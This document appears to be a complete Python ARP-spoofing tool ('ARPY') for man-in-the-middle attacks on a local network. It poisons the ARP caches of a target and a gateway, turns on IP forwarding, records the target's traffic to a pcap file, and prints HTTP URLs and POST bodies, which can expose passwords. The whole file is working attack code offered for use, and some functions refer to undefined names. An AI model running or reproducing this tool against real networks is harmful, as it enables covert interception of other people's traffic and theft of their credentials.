      
#!/usr/bin/python3
import subprocess as sub
import os, sys, threading, signal, time, argparse

LOGO = """

ARP Spoofing tool made by memset-0x00

 $$$$$$\  $$$$$$$\  $$$$$$$\ $$\     $$\ 
$$  __$$\ $$  __$$\ $$  __$$\\$$\   $$  |
$$ /  $$ |$$ |  $$ |$$ |  $$ |\$$\ $$  / 
$$$$$$$$ |$$$$$$$  |$$$$$$$  | \$$$$  /  
$$  __$$ |$$  __$$< $$  ____/   \$$  /   
$$ |  $$ |$$ |  $$ |$$ |         $$ |    
$$ |  $$ |$$ |  $$ |$$ |         $$ |    
\__|  \__|\__|  \__|\__|         \__|

"""

try:
    from scapy.all import *
    from scapy.layers.http import HTTPRequest
    import scapy.all as scapy

    from getmac import get_mac_address
    from colorama import Fore, Back, Style

except:
    print(Fore.RED + "%s\n[!] Libraries not installed" % LOGO)
    os.system("echo y | pip3 install getmac && echo y | pip3 install scapy && echo y | pip3 install scapy_http && echo y | pip3 install colorama")

    print(Fore.RED + "[!] Restarting..")
    os.execv(sys.executable, ['python3'] + sys.argv)

def cli():
    os.system("clear")
    print(Fore.GREEN + LOGO +"\n"+"Use the following format; [iface] [target1] [target2] [outfile]"+"\n")
    wd = subprocess.check_output(["pwd"])

    while True:
        try:
            cmd = input((wd[:-1].decode())+"$ ")
            argv = cmd.split()
        
            if len(argv) == 4:
                try: main(argv[0], argv[1], argv[2], argv[3])
                except Exception as err: 
                    print(Fore.RED + "[!] "+str(err))
                    exit()
                
                exit()

        except Exception as err: print(Fore.RED + "[!] ", str(err))
        except KeyboardInterrupt: exit()

def mk_pcap(outfile, targip):
    xterm_sniff = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-w', outfile), stdout=sub.PIPE)
    print(Fore.GREEN + "[+] Capturing packets on thread %s" % str(threading.get_ident()))

def restore(gateway_ip, gateway_mac, target_ip, target_mac):
    # resetting arp cache of gateway and target machine
    # by sending arp packets to the broadcast addr (ff:ff:ff:ff:ff:ff)
    try:
        print(Fore.RED + "[!] Restoring gateway and target hwaddr...")
        send(ARP(op=2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
        send(ARP(op=2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

        exit()
    
    except Exception as err:
        print(Fore.RED + "[!] Error, " + str(err))
        exit()

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
    # forward ipv4 traffic
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Enabled IPv4 forwarding")
          
    # (opcode = 2) = ARP REPLY, update the targets' MAC table
    poison_target = ARP()
    
    poison_target.op = 2
    poison_target.psrc = gateway_ip #  this field contains the supposed IP address of the device that is sending the response
    poison_target.pdst = target_ip  # IPv4 address of the intended receiver
    poison_target.hwdst = target_mac
    # no need to define hwsrc as we are sending it..
    poison_gateway = ARP()
    
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print(Fore.GREEN + "[+] Starting ARP poisoning on %s (CTRL+C to stop)" % interface)
    
    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(0.5)
            
        except KeyboardInterrupt: 
            print(Fore.RED + "[!] KeyboardInterrupt exception")
            restore(gateway_ip, gateway_mac, target_ip, target_mac)

    print(Fore.RED + "[!] ARP poisoning terminated")
    sys.exit(0)

def xterm_packetviewer(targip):
    xterm_sniff = sub.Popen(('xterm', '-hold', '-e', 'sudo', 'tcpdump', 'ip', 'host', targip, '-vv', '-A'), stdout=sub.PIPE)

    try: 
        for packet in iter(xterm_sniff.stdout.readline, b''): print(packet.rstrip())  # iter() to make an iteration

    except KeyboardInterrupt:
        restore(gatewy, gatewy_mac, targip, target_mac)
        time.sleep(2)
        sys.exit(0)
    
def proc_traffic(packet):
    # checks if individual packet is HTTP Request

    if packet.haslayer(HTTPRequest):

        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[HTTPRequest].Method.decode()

        print("[?] Requested URL: " + str(url))
        if packet.haslayer(Raw) and method == "POST": print((packet[Raw].load).decode())

def tcpdump_traffic(gatewy, gatewy_mac, targip, target_mac):
    tcpdump_xterm = sub.Popen(('xterm', '-hold', '-e', 'sudo', 'tcpdump', 'ip', 'host', targip, '-vv', '-A'), stdout = subprocess.PIPE)
    
    try: 
        for packet in iter(tcpdump_xterm.stdout.readline, b''): print(packet.rstrip())  # iter() to make an iteration

    except KeyboardInterrupt:
        restore(gatewy, gatewy_mac, targip, target_mac)
        time.sleep(2)
        sys.exit(0)

def main(interf, targip, gatewy, outfile):
    # setting interface and disabling verbose
    conf.iface = interf
    conf.verb = 0
    print(Fore.GREEN + "[+] Setting up %s " % interf)

    # gathering mac addr
    gatewy_mac = get_mac_address(ip=gatewy)
    target_mac = get_mac_address(ip=targip)

    if gatewy_mac == '00:00:00:00:00:00' or target_mac == '00:00:00:00:00:00':
        print(Fore.RED + "[!] Unable to resolve mac addr, exiting")
        sys.exit(0)

    else: print(Fore.GREEN + "[+] Target1 = %s && Target2 = %s" % (target_mac, gatewy_mac))

    # starting arp poisoning
    poison_t = threading.Thread(target = poison_target, args = (gatewy, gatewy_mac, targip, target_mac, interf))
    poison_t.daemon = True
    poison_t.start()
    
    # create output file (pcap)
    mk_outfile = threading.Thread(target = mk_pcap, args = (outfile, targip))
    mk_outfile.daemon = True
    mk_outfile.start()
    
    # tcpdump thread
    tcpdump_t = threading.Thread(target = tcpdump_traffic, args = (gatewy, gatewy_mac, targip, target_mac))
    tcpdump_t.start()

    # analyses traffic, proc_traffic for traffic processing
    scapy.sniff(iface = interf, store = False, prn = proc_traffic, filter = ("host %s" % targip))

if __name__ == "__main__":
    # e.g sudo python3 arpy.py wlp4s0 192.168.1.10 192.168.1.1 out
    try:
        interface = sys.argv[1]
        target_ip = sys.argv[2]
        gatewy_ip = sys.argv[3]
        output_fl = sys.argv[4]

        ls_dir = subprocess.check_output(['ls'])

        if output_fl in str(ls_dir): print(Fore.RED + "[!] Output file already exists")
        else: main(interface, target_ip, gatewy_ip, output_fl)
    
    except Exception as err: cli()
  
